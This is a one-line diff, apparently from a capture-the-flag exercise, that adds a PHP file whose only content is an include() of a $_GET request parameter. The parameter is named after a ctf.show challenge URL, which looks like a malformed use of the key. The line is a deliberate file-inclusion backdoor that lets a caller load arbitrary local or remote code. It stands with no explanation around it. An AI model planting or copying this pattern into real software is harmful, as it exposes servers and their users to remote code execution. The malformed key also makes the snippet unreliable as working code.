@@ -1,0 +1,1 @@
+<?php include($_GET['http://4e64c8d0-b42e-45d0-8e96-119cd62b7784.challenge.ctf.show/']);?>
